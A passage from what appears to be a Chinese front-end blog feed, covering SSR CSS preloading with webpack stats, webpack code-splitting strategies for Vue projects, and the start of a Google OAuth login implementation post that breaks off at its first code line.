判断当前页面应该加载的 js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getPreloadLinkByChunkNames</span>(<span class="params">chunkNames, stats</span>) &#123;</span><br><span class="line"><span class="comment">// 获取到 webpack 中配置的 publicPath</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PUBLIC_PATH</span> = stats.<span class="property">publicPath</span>;</span><br><span class="line"><span class="keyword">const</span> cssAssets = [];</span><br><span class="line"><span class="keyword">const</span> jsAssets = [];</span><br><span class="line">chunkNames.<span class="title function_">forEach</span>(<span class="function"><span class="params">name</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">const</span> currentCssAssets = [];</span><br><span class="line"><span class="keyword">const</span> currentJsAssets = [];</span><br><span class="line"><span class="comment">//  根据具名子包，查询到所依赖的资源</span></span><br><span class="line">stats.<span class="property">namedChunkGroups</span>[name]?.<span class="property">assets</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (item.<span class="property">name</span>.<span class="title function_">endsWith</span>(<span class="string">&#x27;.css&#x27;</span>)) &#123;</span><br><span class="line">                currentCssAssets.<span class="title function_">push</span>(<span class="string">`<span class="subst">$&#123;PUBLIC_PATH&#125;</span><span class="subst">$&#123;item.name&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (item.<span class="property">name</span>.<span class="title function_">endsWith</span>(<span class="string">&#x27;.js&#x27;</span>)) &#123;</span><br><span class="line">                currentJsAssets.<span class="title function_">push</span>(<span class="string">`<span class="subst">$&#123;PUBLIC_PATH&#125;</span><span class="subst">$&#123;item.name&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;);</span><br><span class="line">cssAssets.<span class="title function_">push</span>(...currentCssAssets);</span><br><span class="line">jsAssets.<span class="title function_">push</span>(...currentJsAssets);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 资源去重</span></span><br><span class="line"><span class="keyword">const</span> assets = <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Set</span>([...cssAssets, ...jsAssets]));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成资源标签</span></span><br><span class="line"><span class="keyword">const</span> links = assets.<span class="title function_">map</span>(<span class="function"><span class="params">asset</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(asset.<span class="title function_">endsWith</span>(<span class="string">&#x27;.css&#x27;</span>)) &#123;</span><br><span class="line"><span class="comment">// preload 能够使页面更快的加载 css 资源</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">`&lt;link rel=&quot;preload&quot; as=&quot;style&quot; href=&quot;<span class="subst">$&#123;asset&#125;</span>&quot;&gt;`</span></span><br><span class="line">+ <span class="string">`&lt;link rel=&quot;stylesheet&quot; as=&quot;style&quot; href=&quot;<span class="subst">$&#123;asset&#125;</span>&quot;&gt;`</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (asset.<span class="title function_">endsWith</span>(<span class="string">&#x27;.js&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">`&lt;script defer=&quot;defer&quot; src=&quot;<span class="subst">$&#123;asset&#125;</span>&quot;&gt;&lt;/script&gt;`</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> links.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据路由的 meta 获取当前页面的具名 chunk</span></span><br><span class="line"><span class="comment"> * 比如当用户访问 `/home` 页面，根据上面路由的定义</span></span><br><span class="line"><span class="comment"> * currentPageChunkNames 得到的值就是 [&#x27;layout&#x27;, &#x27;home-page&#x27;]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> currentPageChunkNames = router.<span class="property">currentRoute</span>.<span class="property">value</span>.<span class="property">matched</span>.<span class="title function_">map</span>(</span><br><span class="line"><span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">meta</span>?.<span class="property">chunkName</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取生成的 stats.json</span></span><br><span class="line"><span class="keyword">const</span> stats = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(fs.<span class="title function_">readFileSync</span>(<span class="comment">/** ... ... */</span>, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">const</span> preloadLinks = <span class="title function_">getPreloadLinkByChunkNames</span>(currentPageChunkNames, stats);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取模板</span></span><br><span class="line"><span class="keyword">const</span> template = fs.<span class="title function_">readFileSync</span>(<span class="comment">/** ... ... */</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> html = template.<span class="title function_">toString</span>()</span><br><span class="line">.<span class="title function_">replate</span>(<span class="string">&#x27;&lt;!-- preload-links --&gt;&#x27;</span>, $&#123;preloadLinks&#125;)</span><br><span class="line">.<span class="title function_">replace</span>(<span class="string">&#x27;&lt;!-- app-html --&gt;&#x27;</span>, <span class="string">`<span class="subst">$&#123;appContent&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// 向客户端发送渲染出的 html</span></span><br><span class="line">res.<span class="title function_">send</span>(html)</span><br></pre></td></tr></table></figure><p>综上，我们成功解决了服务端首屏渲染的样式闪烁问题，拿到资源标签后我们页可以按需进行预加载或者其他操作。如果还想进一步提升性能，也可以将 CSS 资源直接读取，内联到 HTML 页面中，这样能进一步的提升页面的渲染速度，但是过多的内联也会让加载 HTML 资源过重，是去 CDN 的优势，总之性能优化方面的取舍还需要根据业务场景进行具体的判断。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webpack </tag>
            
            <tag> Vue </tag>
            
            <tag> SSR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建服务端渲染应用时的 Webpack 分包策略</title>
      <link href="/2023/05/a1ba1aacf17e.html"/>
      <url>/2023/05/a1ba1aacf17e.html</url>
      
        <content type="html"><![CDATA[<h1 id="为什么要分包"><a href="#为什么要分包" class="headerlink" title="为什么要分包"></a>为什么要分包</h1><p>当搭建的应用注重用户打开速度时，合理的分包策略有助于减少用户首屏加载应用时加载的资源数量，并且对于部分资源可以复用，避免重复加载，从而提升用户体验。</p><p>举例来说，使用 webpack 进行合理的分包可以达到如下效果，比如：</p><ul><li>让项目的分包体积更小，充分利用浏览器并行加载的能力，避免加载过大的 chunk。</li><li>当前项目是基于 vue 的，如果按照默认的分包策略，项目每次更新后都会生成新的 main.js，main.js 中又包含了 vue 的代码，相当于每次项目更新，用户都要重新下载一遍 vue 的代码，这是没有必要的。通过改写分包策略，可以将 vue 相关的代码单独生成一个包，将其缓存到客户端后，后续的每次应用更新就不需要客户端下载重复的代码。</li><li>剥离 ElementPlus 相关的代码，使得在 SSR 时可以预加载 ElementPlus 的样式，避免样式闪烁。</li></ul><h1 id="使用动态导入"><a href="#使用动态导入" class="headerlink" title="使用动态导入"></a>使用动态导入</h1><p>webpack 提供了 <a href="https://webpack.docschina.org/guides/code-splitting/#dynamic-imports">动态导入(dynamic import)</a> 功能来实现了可以在应用运行时懒加载一些 JS 代码。</p><h2 id="示例-1：懒加载-SDK"><a href="#示例-1：懒加载-SDK" class="headerlink" title="示例 1：懒加载 SDK"></a>示例 1：懒加载 SDK</h2><p>比如，当我们使用一个比较大的第三方 SDK 时，如百度云的 Bos 文件上传 SDK，如果我们不做任何优化，那么 webpack 会将这个 SDK 打包到应用的主包中，那么就会导致用户无论用户是否有用到文件上传的功能，在页面加载时都会去下载百度云的文件上传 SDK，那么这个下载行为既会浪费带宽，又会阻塞页面的渲染，使用户的白屏时间加长。</p><p>为了避免这个问题，我们就可以通过使用 webpack 的动态导入功能，让用户点击『上传』按钮时，再去加载文件上传的 SDK，这样就真正坐到了按需加载，示例代码如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">loadBaiduCloudSdk</span> = (<span class="params"></span>) =&gt; <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;baiducloud&quot; */</span> <span class="string">&#x27;@baiducloud/sdk&#x27;</span>);</span><br><span class="line"></span><br><span class="line">uploadBtnEl.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"><span class="keyword">const</span> &#123;<span class="title class_">BosClient</span>&#125; = <span class="keyword">await</span> <span class="title function_">loadBaiduCloudSdk</span>();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">BosClient</span>(&#123;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里我们使用了 <a href="https://webpack.docschina.org/api/module-methods/#magic-comments">magic comment</a> 的 webpackChunkName 来显式指定了 webpack 打包的 JS 代码块的名称，当构建完成后，如果我们的 <code>chunkFilename</code> 定义的为 <code>[name].[contenthash:8].js</code> ，那么我们就会发现构建产出中为 Bos SDK 单独生成了一个 <code>baiducloud.xxxxxxxx.js</code> 的文件。在 Chrome DevTool 中的 network 面板中可以看到，当用户点击上传按钮后浏览器才会下载这个 chunk：</p><p><img src="https://s2.loli.net/2023/05/24/whaftINZkbYGWpD.png" alt=""></p><h2 id="示例-2：Vue-按需加载-i18n-语言包"><a href="#示例-2：Vue-按需加载-i18n-语言包" class="headerlink" title="示例 2：Vue 按需加载 i18n 语言包"></a>示例 2：Vue 按需加载 i18n 语言包</h2><p>如果应用需要多语言功能，那么只有当用户访问对应语言版本的网站时才需要加载这个网站的语言包，而不是一次性加载所有的语言包，利用 webpack 动态导入我们可以实现这一点。</p><p>我们的文件结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lang</span><br><span class="line">  ├── en-US.ts</span><br><span class="line">  ├── zh-CN.ts</span><br><span class="line">  ├── ar.ts</span><br><span class="line">  ├── ur.ts</span><br><span class="line">  └── ... ...</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// en-US.ts</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"><span class="attr">hello</span>: <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line"><span class="attr">word</span>: <span class="string">&#x27;Word&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们编写一个 <code>loadLang</code> 函数：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// en-US 不进行懒加载，因为其作为 FALLBACK_LANG 是必须加载的</span></span><br><span class="line"><span class="keyword">import</span> messageSchema <span class="keyword">from</span> <span class="string">&#x27;./lang/en-US&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FALLBACK_LANG</span> = <span class="string">&#x27;en-US&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">loadLang</span>(<span class="params">i18n: I18n, lang: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> messages = <span class="keyword">await</span> <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;locale-[request]&quot; */</span> <span class="string">`./lang/<span class="subst">$&#123;lang&#125;</span>.ts`</span>);</span><br><span class="line">    <span class="comment">// set locale and locale message</span></span><br><span class="line">    i18n.<span class="property">global</span>.<span class="title function_">setLocaleMessage</span>(locale, messages.<span class="property">default</span>);</span><br><span class="line">    <span class="comment">// set fallback langs</span></span><br><span class="line">    i18n.<span class="property">global</span>.<span class="title function_">setLocaleMessage</span>(<span class="variable constant_">FALLBACK_LANG</span>, messageSchema);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当页面加载时，我们按照页面路径来为用户按需加载语言：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.ts</span></span><br><span class="line"><span class="keyword">const</span> i18n = <span class="title function_">createI18n</span>(&#123;locale, <span class="attr">legacy</span>: <span class="literal">false</span>, <span class="attr">fallbackLocale</span>: <span class="variable constant_">FALLBACK_LANG</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以 vue router 的路由守卫为示例，在加载页面前去下载对应的语言包</span></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="keyword">async</span> (to, _from, next) =&gt; &#123;</span><br><span class="line"><span class="keyword">const</span> pathname = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span>;</span><br><span class="line">    <span class="keyword">let</span> lang = pathname.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="comment">// set i18n</span></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">loadLocaleMessages</span>(i18n, lang);</span><br><span class="line"><span class="title function_">setI18nLanguage</span>(i18n, lang);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(i18n)</span><br></pre></td></tr></table></figure><p>我们可以通过 webpack-bundle-analyzer 看出，所有的语言都被 webpack 单独打包为了一个独立的 JS，如：</p><p><img src="https://s2.loli.net/2023/05/24/oQCl43qRxGEkO8b.png" alt=""></p><p>当用户访问对应的语言时（除了 en-US，因为其作为 FALLBACK_LANG 会始终被加载），对应的语言包才会被加载。</p><h2 id="示例-3：vue-router-路由懒加载"><a href="#示例-3：vue-router-路由懒加载" class="headerlink" title="示例 3：vue-router 路由懒加载"></a>示例 3：vue-router 路由懒加载</h2><p>vue-router 的路由懒加载实际上也是动态导入的一种应用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将</span></span><br><span class="line"><span class="comment">// import UserDetails from &#x27;./views/UserDetails.vue&#x27;</span></span><br><span class="line"><span class="comment">// 替换成</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">UserDetails</span> = (<span class="params"></span>) =&gt; <span class="title function_">import</span>(<span class="string">&#x27;./views/UserDetails.vue&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">routes</span>: [&#123; <span class="attr">path</span>: <span class="string">&#x27;/users/:id&#x27;</span>, <span class="attr">component</span>: <span class="title class_">UserDetails</span> &#125;],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>如果使用了 webpack，可以使用命名 chunk：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">UserDetails</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">  <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;group-user&quot; */</span> <span class="string">&#x27;./UserDetails.vue&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">UserDashboard</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">  <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;group-user&quot; */</span> <span class="string">&#x27;./UserDashboard.vue&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">UserProfileEdit</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">  <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;group-user&quot; */</span> <span class="string">&#x27;./UserProfileEdit.vue&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="使用-optimization-splitChunks"><a href="#使用-optimization-splitChunks" class="headerlink" title="使用 optimization.splitChunks"></a>使用 optimization.splitChunks</h1><p>Webpack 提供了 <code>optimization.splitChunks</code> 选项来提供给开发编写一些自定义的分包策略。对于普通的开发者来说，Webpack 的默认分包策略已经足够，其默认分包策略为：</p><ul><li>新的 chunk 可以被共享，或者模块来自于 <code>node_modules</code> 文件夹</li><li>新的 chunk 体积大于 20kb（在进行 min+gz 之前的体积）</li><li>当按需加载 chunks 时，并行请求的最大数量小于或等于 30</li><li>当加载初始化页面时，并发请求的最大数量小于或等于 30</li></ul><p>借助这个配置项，我们可以更细化的配置项目的产出。</p><h2 id="示例-1：单独打包-vue-文件"><a href="#示例-1：单独打包-vue-文件" class="headerlink" title="示例 1：单独打包 vue 文件"></a>示例 1：单独打包 vue 文件</h2><p>假设我们在使用 webpack 编写一个 vue 项目，那么通常 vue 的版本在每次迭代应用版本后通常是不会发生改变的，如果我们可以将 vue 相关的代码打包成一个包，并利用浏览器缓存缓存起来这个包，那么在应用每次迭代后，客户端就能尽可能的少产生新的文件变更，网站加载就不会因为频繁迭代上线而让客户端需要频繁下载之前已经缓存好的资源。</p><p>利用 <code>splitChunks</code> 我们利用文件名匹配的方式来获取到 vue 相关的代码，并将其打包成一个 <code>vue-bundle.[hash].js</code> 这样的文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">optimization</span>: &#123;</span><br><span class="line"><span class="attr">splitChunks</span>: &#123;</span><br><span class="line"><span class="attr">chunks</span>: <span class="string">&#x27;all&#x27;</span>,</span><br><span class="line"><span class="attr">minSize</span>: <span class="number">30000</span>,</span><br><span class="line"><span class="attr">maxAsyncRequests</span>: <span class="number">5</span>,</span><br><span class="line"><span class="attr">cacheGroups</span>: &#123;</span><br><span class="line"><span class="attr">vue</span>: &#123;</span><br><span class="line"><span class="comment">// 优先级</span></span><br><span class="line"><span class="attr">priority</span>: <span class="number">20</span>,</span><br><span class="line"><span class="attr">test</span>: <span class="regexp">/[\\/]node_modules[\\/](vue|vue-router|vuex)[\\/]/</span>,</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;vue&#x27;</span>,</span><br><span class="line"><span class="attr">chunks</span>: <span class="string">&#x27;all&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// ... ...</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><blockquote><p><code>optimization.splitChunks.chunks</code> 其默认值为 <code>async</code> ，即只为使用了异步导入方式（即动态导入）引入的包才会被拆分为一个单独的 js。设置为 <code>all</code> 后，webpack 会尝试对所有的代码块进行拆分，包括同步引入的代码，即使是单入口文件，只要文件超出一定的体积、被多个文件引用一定次数或其他限定条件时，就会被拆分成子包。</p></blockquote><h2 id="示例-2：单独打包-ElementPlus-的-CSS-样式"><a href="#示例-2：单独打包-ElementPlus-的-CSS-样式" class="headerlink" title="示例 2：单独打包 ElementPlus 的 CSS 样式"></a>示例 2：单独打包 ElementPlus 的 CSS 样式</h2><p>在 web 应用加载时，如果遇到 CSS 文件会阻塞页面的渲染，尤其是对于一个使用了 Vue 或 React 框架的项目来说，在页面加载时，通常会加载一个 runtime 文件来获取当前页面的依赖，然后再去拉取当前页面需要 JS 和 CSS，这样就使得页面白屏时间更长了。</p><p>那么倘若我们能够提前加载好某些 CSS，整个页面的白屏时长必定会减少一些，尤其是对于 SSR 的项目来说，提前加载 CSS 是非常有必要的。</p><p>以 ElementPlus 为例，我们可以单独将 ElementPlus 的样式给打包成一个 CSS 文件，并将其写入到 HTML 模板中，这样在页面加载时，并且在 runtime 执行前就能提前加载 ElementPlus 组件的样式了，减少了资源加载的等待时长。</p><blockquote><p>如果项目在入口就引用到了 ElementPlus，那么 <code>html-webpack-plugin</code> 生成的 HTML 文件中就会自动加上 ElementPlus 的 css 文件。</p></blockquote><p>代码示例如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">optimization</span>: &#123;</span><br><span class="line"><span class="attr">splitChunks</span>: &#123;</span><br><span class="line"><span class="attr">chunks</span>: <span class="string">&#x27;all&#x27;</span>,</span><br><span class="line"><span class="attr">minSize</span>: <span class="number">30000</span>,</span><br><span class="line"><span class="attr">maxAsyncRequests</span>: <span class="number">5</span>,</span><br><span class="line"><span class="attr">cacheGroups</span>: &#123;</span><br><span class="line"><span class="attr">elementPlus</span>: &#123;</span><br><span class="line"><span class="comment">// 优先级</span></span><br><span class="line"><span class="attr">priority</span>: <span class="number">20</span>,</span><br><span class="line"><span class="attr">test</span>: <span class="regexp">/[\\/]node_modules[\\/]element-plus(.*)/</span>,</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;element-plus&#x27;</span>,</span><br><span class="line"><span class="attr">chunks</span>: <span class="string">&#x27;all&#x27;</span>,</span><br><span class="line"><span class="comment">// 指定这条策略只对 css 生效</span></span><br><span class="line"><span class="attr">type</span>: <span class="string">&quot;css/mini-extract&quot;</span>,</span><br><span class="line"><span class="attr">enforce</span>: <span class="literal">true</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ... ...</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>注意：如果要只单独打包 css，是需要借助 <code>mini-css-extract-plugin</code> 插件来实现的，因为这个插件是用于将引入的 css 进行拆分并打包成单独的 css。只有使用了这个插件，<code>cacheGroups</code> 中的 <code>type</code> 才会有 <code>css/mini-extract</code> 这个值（<a href="https://github.com/webpack-contrib/mini-css-extract-plugin#extracting-all-css-in-a-single-file">参考</a>）。</p><blockquote><p>除了 type 为 <code>css/mini-extract</code> 之外，还可以设置 <code>auto/javascript</code> 来将 cacheGorup 规则单独应用为 js 文件上，而 CSS 走默认的规则。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OAuth 第三方平台登录接入前后端实现方案</title>
      <link href="/2023/05/88f74a231b05.html"/>
      <url>/2023/05/88f74a231b05.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文将以 Google 登录流程为示例，演示前后端登录接入的实现方案</p></blockquote><h1 id="1-整体流程"><a href="#1-整体流程" class="headerlink" title="1. 整体流程"></a>1. 整体流程</h1><p><img src="https://s2.loli.net/2023/05/12/d3SDNuXrJCWzeHf.png" alt="时序图"></p><ol><li>用户在 <strong>应用登录入口页面</strong> 点击登录按钮，浏览器调用 <code>window.open</code> 打开 <strong>登录跳转页</strong> ，并使用 type 标记登录类型，如：<code>https://auth.app.com/passport?type=google</code>，此时 <strong>应用登录入口页面（也就是父页面）</strong> 要使用 <code>postMessage</code> 持续为打开的窗口发送消息，探测是否已经完成登录流程</li><li>服务端收到 <code>/passport?type=google</code> 的请求，构建 <strong>Google 的登录授权页</strong> URL</li><li>用户输入账号信息，授权登录</li><li><strong>Google 登录授权页</strong> 将授权 <code>code</code> 等信息作为 RedirectURI 的 url query 并将当前页面重定向到该页面到 <strong>授权成功页</strong> ，如：<code>https://auth.app.com/sign?type=google</code></li></ol><blockquote><p>如 RedirectURI 为 <code>https://auth.app.com/sign?type=google</code>（RedirectURI 需要在 Google API 服务控制面板添加到列表中），那么登录成功后，客户端浏览器会跳转到 <code>https://auth.app.com/sign?type=google&amp;code=xxx&amp;scope=xxx&amp;authuser=0&amp;prompt=xxx</code> 这个页面</p></blockquote><ol start="5"><li><strong>授权成功页</strong> 被客户端访问后，服务端收到 <code>/sign?type=google&amp;code=xxx&amp;...</code> 的请求，解构 url query 中的信息，并调用 Google OAuth 接口获取到授权 AccessToken，并使用 AccessToken 获取用户信息（用户id、邮箱等）。</li><li>服务端进行用户信息存取操作后，生成一个当前应用的 token（如使用 JWT 规范），并调用 setCookie 为客户端的根域名的 cookie 中植入 token，同时使用 302 重定向到一个 <strong>登录成功落地页</strong> ，如 <code>https://auth.app.com/auto_login.html</code></li><li><strong>登录成功落地页</strong> 回应父窗口的 <code>postMessage</code> 信息，并关闭当前页面</li><li><strong>应用登录入口页面</strong> 收到来自 <strong>登录成功落地页</strong> 的回应，刷新当前页面（也可不用刷新）改变当前页面显示的用户登录态</li></ol><p>上面描述的流程涉及如下几个页面，在此进行整理和说明：</p><ul><li><strong>应用登录入口页面</strong>：即存在登录按钮的页面，负责打开后续登录窗口，并持续与登录窗口进行轮询通信。</li><li><strong>登录跳转页</strong>：用户点击登录按钮后打开新窗口后首先访问的页面，负责向后台请求第三方应用（如 Google ）的登录地址。</li><li><strong>登录授权页</strong>：是第三方应用的登录页面，如 Google 的 OAuth 授权页面，用户在此界面选择账号进行授权或者输入 Google 的账号密码进行授权。</li><li><strong>授权成功页</strong>：即为第三方账号授权成功后重定向到的目标页面，用于通知当前应用服务端授权成功。</li><li><strong>登录成功落地页</strong>：一个空白页面，用于通知父窗口（应用登录入口页面）登录成功，同时关闭自身窗口。</li></ul><p><img src="https://s2.loli.net/2023/05/12/W5VfPEcAsM6OkjH.png" alt=""></p><h1 id="2-服务端实现"><a href="#2-服务端实现" class="headerlink" title="2. 服务端实现"></a>2. 服务端实现</h1><p>服务端主要实现两个路由，一个是 <code>登录跳转页</code> 的路由，用于按照请求类型重定向到第三方应用的登录界面。另外一个是 <code>授权成功页</code> 的路由，用于处理拿到用户后服务端的操作，并为客户端植入 cookie，同时重定向到登录成功落地页。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 